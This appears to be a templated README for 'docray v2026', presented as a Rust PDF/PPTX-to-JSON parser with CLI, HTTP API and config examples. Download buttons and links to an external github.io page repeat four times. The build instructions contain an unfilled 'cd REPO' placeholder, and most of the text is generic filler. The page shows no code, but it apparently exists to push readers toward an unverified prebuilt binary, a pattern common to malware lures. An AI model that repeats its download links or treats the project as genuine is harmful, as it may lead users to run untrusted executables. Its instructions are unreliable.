# docray v2026 - document parsing service 2026

> **Lossless PDF and PPTX extraction with structured JSON, bounding boxes, and API access in a Rust-based toolchain.** docray v2026 combines metadata-preserving parsing with practical access through a command-line interface, HTTP API, and visual playground.

[![Platform](https://img.shields.io/badge/Platform-PDF%20and%20PPTX-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/michaelbennettkc5212/docray-rust-parser?style=flat-square)](https://github.com/michaelbennettkc5212/docray-rust-parser)

---

<p align="center">
  <a href="https://michaelbennettkc5212.github.io/docray-rust-parser/">
    <img src="https://img.shields.io/badge/Download-docray%20Latest-brightgreen?style=for-the-badge" alt="Download docray">
  </a>
</p>

> **[Download docray v2026](https://michaelbennettkc5212.github.io/docray-rust-parser/)**

---

[Download Latest Build](https://michaelbennettkc5212.github.io/docray-rust-parser/)

---

## Overview

docray converts PDF and PPTX documents into structured JSON while retaining information about their visual arrangement. Rather than reducing files to plain text, it preserves the relationships among characters, words, and larger document elements for use in automation, search, and analysis workflows.

The extracted data can include page-space coordinates, bounding boxes, font information, colors, images, vector paths, and annotations. This makes docray suitable for pipelines that need to connect machine-readable content with the original document layout. Local processing, remote access, and interactive inspection are supported through the CLI, HTTP API, and visual playground.

---

## What It Provides

- Structured, lossless extraction of document content
- Character-, word-, and element-level output
- Bounding boxes and page coordinates for layout-aware processing
- Font and color details in extracted results
- Handling for images, vector paths, and annotations
- Command-line processing for local use
- HTTP service support for remote or automated integrations
- Both synchronous and asynchronous job workflows
- Visual playground for reviewing parsed documents
- Rust implementation backed by PDFium

---

## Build and Installation

Obtain the source and compile the release binary with Rust:

```bash
git clone https://github.com/michaelbennettkc5212/docray-rust-parser.git
cd REPO
cargo build --release
```

Once compilation completes, use the CLI for local extraction or run the HTTP service for API-based processing. Release users can instead download the latest build and execute the binary from its extracted directory.

---

## Running docray

To parse a document and write its structured representation to JSON, use:

```bash
docray parse input.pdf --output output.json
```

To expose the HTTP interface, start the server:

```bash
docray server
```

Common ways to use docray include:

- converting PDF content into JSON for indexing and retrieval
- passing parsed documents into RAG workflows
- examining layout, coordinates, and metadata in the visual playground
- choosing synchronous jobs for immediate processing or asynchronous jobs for longer operations

---

## Configuration

Depending on the deployment, settings may come from command-line arguments, API request data, or the service runtime. One example configuration is:

```toml
[server]
host = "127.0.0.1"
port = 8080

[output]
format = "json"

[extraction]
include_boxes = true
include_fonts = true
include_colors = true
```

When using a configuration file, place it beside the executable or in the project directory from which the service runs.

---

## Requirements

- PDF or PPTX files as input
- A Rust toolchain when compiling from source
- PDFium for document parsing support
- Sufficient local storage for input files and generated JSON
- A modern system that can run the CLI or HTTP service

---

## Frequently Asked Questions

**How can I update docray?**  
Download the latest build using the link above, or retrieve the newest source and rebuild it locally.

**How are extraction options configured?**  
Use CLI flags, fields in API requests, or the configuration file associated with the deployment.

**What should I check when parsing results are unexpected?**  
Verify the input format, review the selected extraction settings, and use the visual playground to inspect layout and metadata behavior.

**Does docray work with automation?**  
Yes. Its CLI and HTTP API support scripted integrations, while asynchronous jobs can handle processing that takes longer to complete.

**How do I request support or report a problem?**  
Open an issue in the repository or use the support channel provided by the project deployment.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
